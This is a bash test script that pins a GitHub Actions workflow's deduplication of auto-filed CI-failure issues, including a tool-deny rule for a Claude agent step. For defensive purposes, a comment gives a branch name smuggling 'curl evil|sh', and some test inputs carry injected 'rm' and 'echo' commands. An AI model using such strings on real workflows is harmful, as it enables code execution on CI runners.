#!/usr/bin/env bash
# shellcheck disable=SC2016
# SC2016 is deliberate: the `${{ ... }}` strings below are LITERAL GitHub
# expressions asserted against the workflow text, never shell expansions.
#
# Fixture test for the issue deduplication in
# .github/workflows/github-workflow-auto-fix.yml (issue #2744).
#
# Without it the workflow filed one new issue per failing run it could not fix:
# #1777/#1782 (actionlint not on PATH in "Plugin: PR checks") and
# #1204/#1472/#1495/#1508 (OIDC token exchange blocked on PRs that modify a
# workflow file) are each ONE root cause filed as several issues. The fix, a
# port of laurigates/.github#68, is three pieces this test pins:
#
#   1. "Compute failure signature" -- deterministic bash + jq that hashes the
#      most specific failing line of `gh run view --log-failed` (run ids,
#      SHAs, timestamps, UUIDs and runner paths normalised out) to 12 hex.
#   2. "Find existing issue for this failure" -- reads the open-issue listing
#      for a hidden `<!-- auto-fix-signature: <sig> -->` marker, comments on a
#      match, and hands the prompt a directive instead of an unconditional
#      `gh issue create`.
#   3. The Claude step denies `gh issue create` outright outside `create` mode.
#
# It EXTRACTS the shipped `run:` bodies from the workflow with PyYAML and
# executes those -- it never holds a retyped copy, so editing the workflow is
# what this test tests.
#
# Fixtures (scripts/tests/fixtures/auto-fix-signature/, mapped by cases.tsv):
#   real          -- `gh run view <id> --log-failed` output from this repo,
#                    cut to the 3 header lines plus the failing region.
#   reconstructed -- the 2026-04..06 runs behind the duplicate issues are past
#                    log retention (HTTP 410). Each is rebuilt from that run's
#                    jobs API timestamps, its check-run ANNOTATIONS (the
#                    verbatim `##[error]` text, still served) and the failing
#                    line quoted in the issue it produced. Only the lines that
#                    evidence supports are present.
#
# Usage: bash scripts/tests/test-auto-fix-signature.sh [workflow-file]
set -euo pipefail

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd "$script_dir/../.." && pwd)"
WORKFLOW="${1:-$repo_root/.github/workflows/github-workflow-auto-fix.yml}"
FIXTURES="$script_dir/fixtures/auto-fix-signature"

for tool in python3 jq sha256sum; do
  command -v "$tool" >/dev/null || { echo "FATAL: $tool not found on PATH" >&2; exit 1; }
done
python3 -c 'import yaml' 2>/dev/null || { echo "FATAL: PyYAML is required to read the workflow" >&2; exit 1; }

work="$(mktemp -d)"
if [ -z "$work" ] || [ ! -d "$work" ]; then echo "FATAL: mktemp -d failed" >&2; exit 1; fi
trap 'rm -rf "$work"' EXIT

SIG_STEP='Compute failure signature'
LOOKUP_STEP='Find existing issue for this failure'
CTX_STEP='Gather failure context'
CLAUDE_STEP='Analyze and fix with Claude'

pass_count=0
fail_count=0
CASE_NAME=setup
fail() { printf '  FAIL [%s] %s\n' "$CASE_NAME" "$1"; fail_count=$((fail_count + 1)); }
ok() { pass_count=$((pass_count + 1)); }
assert_eq() { # <actual> <expected> <what>
  if [ "$1" = "$2" ]; then ok; else fail "$3: expected '$2', got '$1'"; fi
}
assert_contains() { # <haystack> <needle> <what>
  case "$1" in *"$2"*) ok ;; *) fail "$3: expected to contain '$2'" ;; esac
}
assert_lacks() { # <haystack> <needle> <what>
  case "$1" in *"$2"*) fail "$3: did NOT expect '$2'" ;; *) ok ;; esac
}

# ---------------------------------------------------------------- extraction
# `field` is a dotted path inside the step (`run`, `id`, `if`, `env.X`,
# `with.prompt`). Prints '' when the step or field is absent. `names` lists the
# job's step names in order; `runs` prints every run: body NUL-separated with
# its step label.
yaml_q() { # <mode> [step] [field]
  python3 - "$WORKFLOW" "$@" <<'PY'
import sys, yaml
wf, mode = sys.argv[1], sys.argv[2]
with open(wf) as fh:
    doc = yaml.safe_load(fh)
steps = ((doc.get("jobs") or {}).get("auto-fix") or {}).get("steps") or []
if mode == "names":
    for s in steps:
        print(s.get("name", ""))
elif mode == "runs":
    for i, s in enumerate(steps):
        if "run" in s:
            sys.stdout.write("%s\x1f%s\x00" % (s.get("name") or "step #%d" % i, s["run"]))
elif mode == "field":
    name, path = sys.argv[3], sys.argv[4].split(".")
    for s in steps:
        if s.get("name") == name:
            v = s
            for p in path:
                v = v.get(p) if isinstance(v, dict) else None
            if v is not None:
                sys.stdout.write(v if isinstance(v, str) else str(v))
            break
PY
}
step_field() { yaml_q field "$1" "$2"; }

echo "=== AUTO-FIX SIGNATURE ==="
echo "WORKFLOW=${WORKFLOW#"$repo_root"/}"

# ----------------------------------------------------------------- structure
CASE_NAME=structure
step_field "$SIG_STEP" run > "$work/signature.sh"
step_field "$LOOKUP_STEP" run > "$work/lookup.sh"
have_sig=0; have_lookup=0
if [ -s "$work/signature.sh" ]; then have_sig=1; ok; else
  fail "no '$SIG_STEP' step: nothing fingerprints a failure, so no run can recognise one already filed"; fi
if [ -s "$work/lookup.sh" ]; then have_lookup=1; ok; else
  fail "no '$LOOKUP_STEP' step: nothing looks for an open issue before the agent files one"; fi

names="$(yaml_q names)"
pos() { printf '%s\n' "$names" | { grep -nxF -- "$1" || true; } | head -1 | cut -d: -f1; }
p_ctx="$(pos "$CTX_STEP")"; p_sig="$(pos "$SIG_STEP")"; p_lookup="$(pos "$LOOKUP_STEP")"; p_claude="$(pos "$CLAUDE_STEP")"
if [ -n "$p_ctx" ] && [ -n "$p_sig" ] && [ -n "$p_lookup" ] && [ -n "$p_claude" ] \
   && [ "$p_ctx" -lt "$p_sig" ] && [ "$p_sig" -lt "$p_lookup" ] && [ "$p_lookup" -lt "$p_claude" ]; then ok; else
  fail "steps must run in order: context < signature < lookup < Claude (got ${p_ctx:-?} ${p_sig:-?} ${p_lookup:-?} ${p_claude:-?})"
fi

# The prompt takes its issue instructions from the lookup's directive; an
# unconditional `gh issue create` in the static prompt is the original bug.
prompt="$(step_field "$CLAUDE_STEP" with.prompt)"
assert_contains "$prompt" '${{ steps.existing.outputs.directive }}' "Claude prompt"
assert_lacks "$prompt" 'gh issue create' "Claude prompt (issue creation belongs to the directive)"

# Outside `create` mode the agent must be UNABLE to file an issue, not only
# told not to: a deny rule beats the `Bash(gh issue *)` grant. `gh issue new`
# is an alias of `gh issue create`.
claude_args="$(step_field "$CLAUDE_STEP" with.claude_args)"
assert_contains "$claude_args" \
  "\${{ steps.existing.outputs.mode != 'create' && '--disallowedTools \"Bash(gh issue create *),Bash(gh issue new *)\"' || '' }}" \
  "Claude step claude_args"
# The model/effort standard (.claude/rules/workflow-model-effort.md) survives.
assert_contains "$claude_args" '--model opus' "Claude step claude_args"
assert_contains "$claude_args" '--effort ' "Claude step claude_args"

# Wiring. A mistyped `steps.<id>.outputs.<key>` is neither a YAML nor an
# actionlint error: it evaluates to '' at run time, and an empty SIGNATURE
# turns dedup off with every check green -- the original bug again.
CASE_NAME=wiring
assert_eq "$(step_field "$SIG_STEP" id)" signature "'$SIG_STEP' id"
assert_eq "$(step_field "$LOOKUP_STEP" id)" existing "'$LOOKUP_STEP' id"
while IFS='|' read -r step key want; do
  assert_eq "$(step_field "$step" "env.$key")" "$want" "'$step' env $key"
done <<'WIRING'
Compute failure signature|CONTEXT_DIR|${{ steps.context.outputs.context_dir }}
Compute failure signature|WORKFLOW_NAME|${{ github.event.workflow_run.name }}
Compute failure signature|BRANCH|${{ github.event.workflow_run.head_branch }}
Find existing issue for this failure|SIGNATURE|${{ steps.signature.outputs.signature }}
Find existing issue for this failure|SIGNATURE_INPUT|${{ steps.signature.outputs.line }}
Find existing issue for this failure|PR_NUMBER|${{ steps.context.outputs.pr_number }}
Find existing issue for this failure|RUN_ID|${{ github.event.workflow_run.id }}
Find existing issue for this failure|BRANCH|${{ github.event.workflow_run.head_branch }}
Find existing issue for this failure|WORKFLOW_NAME|${{ github.event.workflow_run.name }}
WIRING
# The outputs those references read must actually be written.
sig_body="$(cat "$work/signature.sh")"; lookup_body="$(cat "$work/lookup.sh")"
for key in signature line source; do assert_contains "$sig_body" "echo \"${key}=" "'$SIG_STEP' writes $key"; done
for key in mode directive; do assert_contains "$lookup_body" "echo \"${key}" "'$LOOKUP_STEP' writes $key"; done

# Every run: body reads run-context values from env:, never from an inline
# `${{ }}`: the expression is pasted into the script before bash parses it,
# so a branch named `x";curl evil|sh;"` would run (github-actions-security.md).
CASE_NAME='no-inline-expressions'
run_seen=0
while IFS= read -r -d '' rec; do
  run_seen=$((run_seen + 1))
  assert_lacks "${rec#*$'\x1f'}" '${{' "'${rec%%$'\x1f'*}' run body"
done < <(yaml_q runs)
if [ "$run_seen" -gt 0 ]; then ok; else fail "found no run: steps; the scan is not reading the job"; fi

# ---------------------------------------------------------------- signatures
run_sig() { # <log file or ''> <workflow name> <branch>
  rm -rf "$work/run"; mkdir -p "$work/run/ctx"
  if [ -n "$1" ]; then cp "$1" "$work/run/ctx/failure-logs.txt"; fi
  : > "$work/run/output"
  set +e
  GITHUB_OUTPUT="$work/run/output" CONTEXT_DIR="$work/run/ctx" WORKFLOW_NAME="$2" BRANCH="$3" \
    bash "$work/signature.sh" > "$work/run/stdout" 2> "$work/run/stderr"
  RC=$?
  set -e
  SIG="$(sed -n 's/^signature=//p' "$work/run/output")"
  SRC="$(sed -n 's/^source=//p' "$work/run/output")"
  LINE="$(sed -n 's/^line=//p' "$work/run/output")"
}

# The line each root cause must hash. Pinning the TEXT, not only the grouping,
# keeps the test from passing against a signature that groups by accident
# (e.g. hashing the generic "Process completed with exit code 1").
expect_group() {
  case "$1" in
    oidc) EXP_SRC=error
      EXP_LINE="Action failed with error: Workflow validation failed. The workflow file must exist and have identical content to the version on the repository's default branch. If you're seeing this on a PR when you first add a code review workflow file to your repository, this is normal and you should ignore this error." ;;
    actionlint) EXP_SRC=diag
      EXP_LINE='<path>: line 1: actionlint: command not found' ;;
    bot-actor) EXP_SRC=error
      EXP_LINE="Action failed with error: Workflow initiated by non-human actor: github-actions (type: Bot). Add bot to allowed_bots list or use '*' to allow all bots." ;;
    shell-lint) EXP_SRC=diag
      EXP_LINE='ERROR: scripts/tests/test-script-to-issue-guard.sh:40: printf/echo of a variable piped into grep -q under pipefail — grep -q exits on its first match, the writer takes SIGPIPE, and pipefail turns a hit into a miss (#2959). Use a here-string: grep -q PATTERN <<<"$var"' ;;
    skill-tests) EXP_SRC=diag
      EXP_LINE='- SEVERITY=ERROR TYPE=test_failed TEST=scripts/tests/test-check-git-sandbox-guards.sh' ;;
    *) EXP_SRC='?'; EXP_LINE='?' ;;
  esac
}

if [ "$have_sig" = 1 ]; then
  : > "$work/sigs.tsv"
  cases=0
  while IFS=$'\t' read -r group workflow branch _provenance fixture; do
    [ "$group" = group ] && continue
    cases=$((cases + 1))
    CASE_NAME="$group/${fixture%.txt}"
    run_sig "$FIXTURES/$fixture" "$workflow" "$branch"
    expect_group "$group"
    assert_eq "$RC" 0 "exit code"
    if grep -qE '^[0-9a-f]{12}$' <<<"$SIG"; then ok; else fail "signature '$SIG' is not 12 hex chars"; fi
    assert_eq "$SRC" "$EXP_SRC" "source"
    assert_eq "$LINE" "$EXP_LINE" "hashed line"
    printf '%s\t%s\n' "$group" "$SIG" >> "$work/sigs.tsv"
  done < "$FIXTURES/cases.tsv"
  CASE_NAME=fixtures
  if [ "$cases" -ge 10 ]; then ok; else fail "read $cases fixture case(s) from cases.tsv, expected 10"; fi

  # One signature per root cause, one root cause per signature. The two
  # duplicate families of #2744 are the load-bearing groups.
  CASE_NAME=grouping
  groups="$(cut -f1 "$work/sigs.tsv" | sort -u)"
  for g in $groups; do
    n="$(awk -F'\t' -v g="$g" '$1 == g { print $2 }' "$work/sigs.tsv" | sort -u | wc -l | tr -d ' ')"
    assert_eq "$n" 1 "distinct signatures in group $g"
  done
  for g in oidc actionlint; do
    n="$(awk -F'\t' -v g="$g" '$1 == g' "$work/sigs.tsv" | wc -l | tr -d ' ')"
    if [ "$n" -ge 2 ]; then ok; else fail "duplicate family $g has $n fixture(s); it must have at least 2 to prove collapse"; fi
  done
  assert_eq "$(cut -f2 "$work/sigs.tsv" | sort -u | wc -l | tr -d ' ')" \
    "$(printf '%s\n' "$groups" | wc -l | tr -d ' ')" "distinct signatures across groups"

  # A branch name is replaced only as a whole token: a substring replace would
  # turn every 'a' into '<branch>' for a branch named 'a'.
  CASE_NAME='branch-token'
  run_sig "$FIXTURES/actionlint-28010059778.txt" 'Plugin: PR checks' 'chore/shell-workflow-lint-gates'; ref="$SIG"
  run_sig "$FIXTURES/actionlint-28010059778.txt" 'Plugin: PR checks' 'a'
  assert_eq "$SIG" "$ref" "signature with branch 'a'"
  run_sig "$FIXTURES/actionlint-28010059778.txt" 'Plugin: PR checks' 'e'
  assert_eq "$SIG" "$ref" "signature with branch 'e'"

  # The workflow name is part of the signature.
  CASE_NAME='workflow-scope'
  run_sig "$FIXTURES/actionlint-28010059778.txt" 'Plugin: Lint skills' 'x'
  if [ -n "$SIG" ] && [ "$SIG" != "$ref" ]; then ok; else fail "the same line in another workflow must not share the signature"; fi

  # Synthetic: every volatile token class in one line. Two runs of the same
  # failure differ in run id, SHA, timestamp, UUID, runner path, branch and a
  # `0x` address; a third differs in one meaningful word.
  CASE_NAME='volatile-tokens'
  synth() { # <run id> <sha> <timestamp> <uuid> <tmp dir> <branch> <word> <address>
    printf 'build\tUNKNOWN STEP\t2026-01-01T00:00:00.0000000Z ##[group]Run fetch\n'
    printf 'build\tUNKNOWN STEP\t2026-01-01T00:00:01.0000000Z ##[error]Failed to fetch %s for https://github.com/o/r/actions/runs/%s at %s (refs/heads/%s) into /home/runner/work/_temp/%s/out.zip via %s/pip-build-env-x at %s by <Worker object at %s> request %s\n' \
      "$7" "$1" "$2" "$6" "$4" "$5" "$3" "$8" "$4"
    printf 'build\tUNKNOWN STEP\t2026-01-01T00:00:02.0000000Z ##[error]Process completed with exit code 1.\n'
  }
  synth 35728723228 a95de74c0ffee 2026-09-22T12:42:21.6272170Z 92636665-3d1e-4f9f-b655-bafc18f1b6d9 /tmp/tmp8h2k feat/one artifacts 0x7f3a2b1c9d40 > "$work/s1.log"
  synth 34770384899 be2fd3b1234567 2026-09-13T17:02:42Z 0f1e2d3c-4b5a-6978-8a9b-0c1d2e3f4a5b /tmp/tmpzz91 fix/two artifacts 0x7F99AA01BE70 > "$work/s2.log"
  synth 34770384899 be2fd3b1234567 2026-09-13T17:02:42Z 0f1e2d3c-4b5a-6978-8a9b-0c1d2e3f4a5b /tmp/tmpzz91 fix/two releases 0x7F99AA01BE70 > "$work/s3.log"
  run_sig "$work/s1.log" CI feat/one; s1="$SIG"; l1="$LINE"
  run_sig "$work/s2.log" CI fix/two; s2="$SIG"
  run_sig "$work/s3.log" CI fix/two; s3="$SIG"
  if [ -n "$s1" ] && [ "$s1" = "$s2" ]; then ok; else fail "volatile tokens leak into the signature ($s1 vs $s2): '$l1'"; fi
  if [ -n "$s3" ] && [ "$s3" != "$s2" ]; then ok; else fail "a meaningful difference must change the signature"; fi
  assert_eq "$l1" 'Failed to fetch artifacts for https://github.com/o/r/actions/runs/<id> at <id> (refs/heads/<branch>) into <path> via <path> at <ts> by <Worker object at <addr>> request <uuid>' "normalised line"

  # The `diag` tier skips a bare `STATUS=ERROR` summary: it names no cause,
  # so hashing it would merge every failure of the workflow into one issue.
  CASE_NAME='diag-skips-status'
  printf 'c\tUNKNOWN STEP\t2026-01-01T00:00:00.0000000Z ERROR: widget.sh:3: frobnicated\nc\tUNKNOWN STEP\t2026-01-01T00:00:01.0000000Z STATUS=ERROR\nc\tUNKNOWN STEP\t2026-01-01T00:00:02.0000000Z ##[error]Process completed with exit code 1.\n' > "$work/status.log"
  run_sig "$work/status.log" CI x
  assert_eq "$SRC" diag "source"
  assert_eq "$LINE" 'ERROR: widget.sh:3: frobnicated' "hashed line"

  # No usable line: dedup is off, not wrong, and the step still exits 0.
  CASE_NAME='no-logs'
  printf 'Could not retrieve logs\n' > "$work/none.log"
  run_sig "$work/none.log" CI x
  assert_eq "$RC" 0 "exit code"; assert_eq "$SIG" '' "signature"; assert_eq "$SRC" none "source"
  CASE_NAME='missing-log-file'
  run_sig '' CI x
  assert_eq "$RC" 0 "exit code"; assert_eq "$SIG" '' "signature"
fi

# ------------------------------------------------------------------ gh stub
# Written with an explicit chmod: a non-executable file on PATH is skipped and
# the REAL gh would run against a live repository.
mkdir -p "$work/bin"
cat > "$work/bin/gh" <<'STUB'
#!/usr/bin/env bash
printf 'STUB-GH-SENTINEL %s\n' "$*" >> "$GH_STUB_CALLS"
case "$1 ${2:-}" in
  "issue list")
    if [ "${GH_STUB_LIST_FAIL:-0}" = 1 ]; then echo 'HTTP 502: Bad Gateway' >&2; exit 1; fi
    cat "$GH_STUB_ISSUES" ;;
  "issue comment")
    printf '%s\n' "$@" > "$GH_STUB_CALLS.comment"
    exit "${GH_STUB_COMMENT_RC:-0}" ;;
  *) echo "stub gh: unexpected call: $*" >&2; exit 97 ;;
esac
STUB
chmod +x "$work/bin/gh"
export PATH="$work/bin:$PATH"
if [ "$(command -v gh)" != "$work/bin/gh" ]; then
  echo "FATAL: gh resolves to '$(command -v gh)', not the stub; refusing to run the lookup cases" >&2
  exit 1
fi
FAKE_REPO=harness.invalid/stub

# -------------------------------------------------------------------- lookup
SIG_A=0123456789ab
marker() { printf '<!-- auto-fix-signature: %s -->' "$1"; }

run_lookup() { # <case> <issues json> <signature> <pr number>
  CASE_NAME="lookup/$1"
  rm -rf "$work/run"; mkdir -p "$work/run"
  printf '%s' "$2" > "$work/run/issues.json"
  : > "$work/run/output"; : > "$work/run/calls"
  set +e
  GH_STUB_CALLS="$work/run/calls" GH_STUB_ISSUES="$work/run/issues.json" \
  GITHUB_OUTPUT="$work/run/output" GITHUB_REPOSITORY="$FAKE_REPO" GITHUB_SERVER_URL=https://github.com \
  SIGNATURE="$3" PR_NUMBER="$4" RUN_ID=123456789 BRANCH=feat/x WORKFLOW_NAME='Plugin: PR checks' \
  SIGNATURE_INPUT="${SIG_INPUT:-<path>: line 1: actionlint: command not found @octocat #1}" \
    bash "$work/lookup.sh" > "$work/run/stdout" 2> "$work/run/stderr"
  RC=$?
  set -e
  MODE="$(sed -n 's/^mode=//p' "$work/run/output")"
  ISSUE="$(sed -n 's/^issue_number=//p' "$work/run/output")"
  DIRECTIVE="$(awk '/^directive<<AUTO_FIX_DIRECTIVE_EOF$/ { f = 1; next } /^AUTO_FIX_DIRECTIVE_EOF$/ { f = 0 } f' "$work/run/output")"
  CALLS="$(cat "$work/run/calls")"
  COMMENT="$(cat "$work/run/calls.comment" 2>/dev/null || true)"
  STDOUT="$(cat "$work/run/stdout")"
}

if [ "$have_lookup" = 1 ]; then
  run_lookup match "[{\"number\":7,\"body\":\"analysis\\n$(marker $SIG_A)\"},{\"number\":9,\"body\":\"$(marker ffffffffffff)\"},{\"number\":3,\"body\":null}]" "$SIG_A" 42
  assert_eq "$RC" 0 "exit code"
  assert_contains "$CALLS" "STUB-GH-SENTINEL issue list --repo $FAKE_REPO --state open" "gh calls"
  assert_eq "$MODE" existing "mode"
  assert_eq "$ISSUE" 7 "issue_number"
  assert_contains "$COMMENT" $'\n7\n' "commented issue"
  assert_contains "$COMMENT" "https://github.com/$FAKE_REPO/actions/runs/123456789" "comment body"
  assert_contains "$COMMENT" 'feat/x' "comment body"
  assert_contains "$COMMENT" '#42' "comment body"
  # The hashed line is shown as an indented code block, so log text cannot
  # render as Markdown, @-mention anyone or link an issue.
  assert_contains "$COMMENT" $'\n\n    <path>: line 1: actionlint: command not found @octocat #1\n' "comment body"
  assert_contains "$DIRECTIVE" '#7' "directive"
  assert_contains "$DIRECTIVE" 'Do NOT create' "directive"
  assert_contains "$DIRECTIVE" 'gh pr comment 42' "directive"
  assert_lacks "$DIRECTIVE" 'gh issue create' "directive"

  SIG_INPUT="$(printf 'x%.0s' $(seq 1 400))" run_lookup long-input "[{\"number\":7,\"body\":\"$(marker $SIG_A)\"}]" "$SIG_A" 42
  assert_contains "$COMMENT" "    $(printf 'x%.0s' $(seq 1 300))" "comment body"
  assert_lacks "$COMMENT" "$(printf 'x%.0s' $(seq 1 301))" "comment body (input capped at 300 characters)"

  run_lookup oldest-wins "[{\"number\":12,\"body\":\"$(marker $SIG_A)\"},{\"number\":7,\"body\":\"$(marker $SIG_A)\"}]" "$SIG_A" 42
  assert_eq "$ISSUE" 7 "issue_number"

  run_lookup create "[{\"number\":9,\"body\":\"$(marker ffffffffffff)\"},{\"number\":4,\"body\":\"unrelated\"}]" "$SIG_A" 42
  assert_eq "$RC" 0 "exit code"
  assert_eq "$MODE" create "mode"
  assert_eq "$ISSUE" '' "issue_number"
  assert_contains "$DIRECTIVE" "$(marker $SIG_A)" "directive (the filed body must carry the marker)"
  assert_contains "$DIRECTIVE" 'gh issue create' "directive"
  assert_contains "$DIRECTIVE" '--label "bug,ci-failure"' "directive"
  assert_contains "$DIRECTIVE" 'gh pr comment 42' "directive"
  assert_eq "$COMMENT" '' "comment call"

  # A body that merely quotes the marker's shape is not a match.
  run_lookup quoted-marker "[{\"number\":5,\"body\":\"design: <!-- auto-fix-signature: <sig> -->\"}]" "$SIG_A" 42
  assert_eq "$MODE" create "mode"

  run_lookup no-signature "[{\"number\":7,\"body\":\"$(marker $SIG_A)\"}]" '' 42
  assert_eq "$RC" 0 "exit code"
  assert_eq "$MODE" create "mode"
  assert_lacks "$DIRECTIVE" 'auto-fix-signature' "directive"
  assert_eq "$COMMENT" '' "comment call"

  GH_STUB_LIST_FAIL=1 run_lookup list-fails '[]' "$SIG_A" 42
  assert_eq "$RC" 0 "exit code"
  assert_eq "$MODE" create "mode"
  assert_contains "$STDOUT" '::warning::' "stdout"

  GH_STUB_COMMENT_RC=1 run_lookup comment-fails "[{\"number\":7,\"body\":\"$(marker $SIG_A)\"}]" "$SIG_A" 42
  assert_eq "$RC" 0 "exit code"
  assert_eq "$MODE" existing "mode"
  assert_contains "$STDOUT" '::warning::' "stdout"

  run_lookup bad-signature '[]' 'NOT-HEX;rm' 42
  if [ "$RC" != 0 ]; then ok; else fail "a malformed signature must fail the step"; fi

  run_lookup no-pr '[]' "$SIG_A" ''
  assert_eq "$MODE" create "mode"
  assert_lacks "$DIRECTIVE" 'gh pr comment' "directive"
  run_lookup pr-not-a-number '[]' "$SIG_A" '42; echo'
  assert_lacks "$DIRECTIVE" 'gh pr comment' "directive"
  assert_lacks "$DIRECTIVE" 'echo' "directive"
fi

# -------------------------------------------------------------------- report
echo "PASSED=$pass_count"
echo "FAILED=$fail_count"
if [ "$fail_count" -gt 0 ]; then
  echo "STATUS=ERROR"
  echo "REASON=$fail_count assertion(s) failed; see FAIL lines above"
  echo "=== END AUTO-FIX SIGNATURE ==="
  exit 1
fi
echo "STATUS=OK"
echo "=== END AUTO-FIX SIGNATURE ==="
